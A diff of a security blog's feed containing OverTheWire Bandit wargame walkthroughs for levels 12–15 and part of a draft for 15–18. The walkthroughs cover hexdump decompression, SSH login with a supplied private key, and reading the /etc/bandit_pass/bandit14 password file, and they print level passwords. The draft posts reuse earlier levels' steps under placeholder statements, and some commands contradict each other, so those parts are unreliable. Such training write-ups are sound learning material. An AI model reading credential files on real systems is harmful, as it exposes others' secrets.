@@ -1,4 +1,793 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-08-30T16:29:01+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">PepperOnion’s Blog</title><subtitle>PepperOnion's personal blog. Security and Linux stuff.</subtitle><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><entry><title type="html">Bandit from level 6 to level 9</title><link href="http://localhost:4000/bandit-6-to-9/" rel="alternate" type="text/html" title="Bandit from level 6 to level 9" /><published>2021-08-29T00:00:00+02:00</published><updated>2021-08-29T00:00:00+02:00</updated><id>http://localhost:4000/bandit-6-to-9</id><content type="html" xml:base="http://localhost:4000/bandit-6-to-9/">&lt;p&gt;&lt;img src=&quot;../assets/images/overthewire.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-07-29T19:52:03+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">PepperOnion’s Blog</title><subtitle>PepperOnion's personal blog. Security and Linux stuff.</subtitle><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><entry><title type="html">Bandit (12 to 15)</title><link href="http://localhost:4000/bandit-12-to-15/" rel="alternate" type="text/html" title="Bandit (12 to 15)" /><published>2022-07-16T00:00:00+02:00</published><updated>2022-07-16T00:00:00+02:00</updated><id>http://localhost:4000/bandit-12-to-15</id><content type="html" xml:base="http://localhost:4000/bandit-12-to-15/">&lt;p&gt;&lt;img src=&quot;../assets/images/overthewire.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;level-12-to-level-13&quot;&gt;Level 12 to Level 13&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands-you-may-need&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;grep             - print lines that match patterns&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;sort             - sort lines of text files&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;uniq             - report or omit repeated lines&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;strings          - print the sequences of printable characters in files&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;base64           - base64 encode/decode data and print to standard output&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;tr               - translate or delete characters&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;tar              - an archiving utility&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;gzip             - compress or expand files&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;bzip2            - a block-sorting file compressor, v1.0.8&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;xxd              - make a hexdump or do the reverse.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;mkdir            - make directories&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;cp               - copy files and directories&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;mv               - move (rename) files&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;file             - determine file type&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;SOLUTION&lt;/h3&gt;
+
+&lt;p&gt;View the contents of the working directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit12@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;data.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Check out the data of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data.txt&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;head&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit12@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head &lt;/span&gt;data.txt
+00000000: 1f8b 0808 0650 b45e 0203 6461 7461 322e  .....P.^..data2.
+00000010: 6269 6e00 013d 02c2 fd42 5a68 3931 4159  bin..&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;...BZh91AY
+00000020: 2653 598e 4f1c c800 001e 7fff fbf9 7fda  &amp;amp;SY.O...........
+00000030: 9e7f 4f76 9fcf fe7d 3fff f67d abde 5e9f  ..Ov...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;?..&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;..^.
+00000040: f3fe 9fbf f6f1 feee bfdf a3ff b001 3b1b  ..............&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+00000050: 5481 a1a0 1ea0 1a34 d0d0 001a 68d3 4683  T......4....h.F.
+00000060: 4680 0680 0034 1918 4c4d 190c 4000 0001  F....4..LM..@...
+00000070: a000 c87a 81a3 464d a8d3 43c5 1068 0346  ...z..FM..C..h.F
+00000080: 8343 40d0 3400 0340 66a6 8068 0cd4 f500  .C@.4..@f..h....
+00000090: 69ea 6800 0f50 68f2 4d00 680d 06ca 0190  i.h..Ph.M.h.....
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In order to work easily we copy the file to a local file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data.hex&lt;/code&gt;. Since it is an hexdump file we have to reverse it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxd&lt;/code&gt; and check out the compression type.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;xxd &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; data.hex &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; data | file data
+data: &lt;span class=&quot;nb&quot;&gt;gzip &lt;/span&gt;compressed data, was &lt;span class=&quot;s2&quot;&gt;&quot;data2.bin&quot;&lt;/span&gt;, last modified: Thu May  7 18:14:30 2020, max compression, from Unix, original size modulo 2^32 573
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So it is a gzip compressed file. We rename it correctly and we decompress the file with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7z&lt;/code&gt;. ( I know this command is not listed at level’s statement but it’s the easiest and universal one.)&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;data data.gzip
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;7z x data.gzip
+Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
+1 file, 606 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Extracting archive: data.gzip
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; data.gzip
+Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gzip
+&lt;/span&gt;Headers Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 20
+
+Everything is Ok
+
+Size:       573
+Compressed: 606
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It returns a new file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data2.bin&lt;/code&gt;. We check the file info and we repeat the process of decompression recursively.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file data2.bin
+data2.bin: bzip2 compressed data, block size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 900k
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;data2.bin data.bzip2
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;7z x data2.bzip2
+Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
+1 file, 573 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Extracting archive: data2.bzip2
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; data2.bzip2
+Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; bzip2
+
+Everything is Ok
+
+Size:       431
+Compressed: 573
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It returns a file called data2. And we repeat the process.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file data2
+data2: &lt;span class=&quot;nb&quot;&gt;gzip &lt;/span&gt;compressed data, was &lt;span class=&quot;s2&quot;&gt;&quot;data4.bin&quot;&lt;/span&gt;, last modified: Thu May  7 18:14:30 2020, max compression, from Unix, original size modulo 2^32 20480
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;data2 data2.gzip
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;7z x data2.gzip
+Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
+1 file, 431 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Extracting archive: data2.gzip
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; data2
+Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gzip
+&lt;/span&gt;Headers Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 20
+
+Everything is Ok
+
+Size:       20480
+Compressed: 431
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We keep decompressing with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7z x&lt;/code&gt; until we get an ASCII file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data9.bin&lt;/code&gt;. We print the content of the file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data9.bin
+The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And we got the password… but we could automate the process of decompressing all files. I copy the script below.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;name_decompressed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;7z l data | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Name&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 2 | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'NF{print $NF}'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+7z x data &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1
+
+
+&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;7z l &lt;span class=&quot;nv&quot;&gt;$name_decompressed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1
+
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;then
+                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;decompressed_next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;7z l &lt;span class=&quot;nv&quot;&gt;$name_decompressed&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Name&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 2 | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'NF{print $NF}'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+                7z x &lt;span class=&quot;nv&quot;&gt;$name_decompressed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name_decompressed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decompressed_next&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else
+                &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name_decompressed&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
+        &lt;span class=&quot;k&quot;&gt;fi
+done&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;level-13-to-level-14&quot;&gt;Level 13 to Level 14&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement-1&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bandit_pass/bandit14&lt;/code&gt; and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands-you-may-need-1&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Same commands as level 12.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;SOLUTION&lt;/h3&gt;
+
+&lt;p&gt;View the files that are present in the current working directory using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;inhere
+sshkey.private
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We have an SSH private key. We can use the SSH command with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-i&lt;/code&gt; flag to use the private key.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; sshkey.private bandit14@localhost
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We just logged in as bandit14 user, so now we can read the password at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bandit_pass/bandit14&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/bandit_pass/bandit14
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;
+
+&lt;h2 id=&quot;level-14-to-level-15&quot;&gt;Level 14 to Level 15&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement-2&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands-you-may-need-2&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;ssh              - OpenSSH remote login client&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;telnet           - user interface to the TELNET protocol&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;nc               - TCP/IP swiss army knife&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;openssl	   - OpenSSL command line tool&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;s_client	   - SSL/TLS client program&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;nmap             - Network exploration tool and security / port scanner&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;solution-2&quot;&gt;SOLUTION&lt;/h3&gt;
+
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="OverTheWire" /><category term="bandit," /><category term="bash" /><summary type="html">https://overthewire.org/wargames/bandit/</summary></entry><entry><title type="html">Bandit (15 to 18)</title><link href="http://localhost:4000/bandit-15-to-18/" rel="alternate" type="text/html" title="Bandit (15 to 18)" /><published>2022-07-16T00:00:00+02:00</published><updated>2022-07-16T00:00:00+02:00</updated><id>http://localhost:4000/bandit-15-to-18</id><content type="html" xml:base="http://localhost:4000/bandit-15-to-18/">&lt;p&gt;&lt;img src=&quot;../assets/images/overthewire.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;level-15-to-level-16&quot;&gt;Level 15 to Level 16&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;**&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands&quot;&gt;COMMANDS&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;cd     - change working directory.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;cat    - concatenate files and print on the standard output.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;file   - determine file type.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;du     - estimate file space usage.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;find   - search for files in a directory hierarchy.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;SOLUTION&lt;/h3&gt;
+
+&lt;p&gt;View the files that are present in the current working directory using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;inhere
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Move into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inhere/&lt;/code&gt; directory. This can be done using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; command&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;inhere/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;View files that are in the directory using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. Since we know the file is hidden we have to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; flag to view hidden files.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+..
+.hidden
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;View the content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.hidden&lt;/code&gt; file using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;
+
+&lt;h2 id=&quot;level-16-to-level-17&quot;&gt;Level 16 to Level 17&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement-1&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;**
+**&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands-1&quot;&gt;COMMANDS&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;cd     - change working directory.&lt;/em&gt;
+                                                                                                                                                                           &amp;gt;
+&lt;em&gt;cat    - concatenate files and print on the standard output.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;file   - determine file type.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;du     - estimate file space usage.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;find   - search for files in a directory hierarchy.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;SOLUTION&lt;/h3&gt;
+
+&lt;p&gt;View the files that are present in the current working directory using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. Next move into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inhere/&lt;/code&gt; directory. This can be done using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;inhere
+
+bandit4@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;inhere/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;View files that are in the directory using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
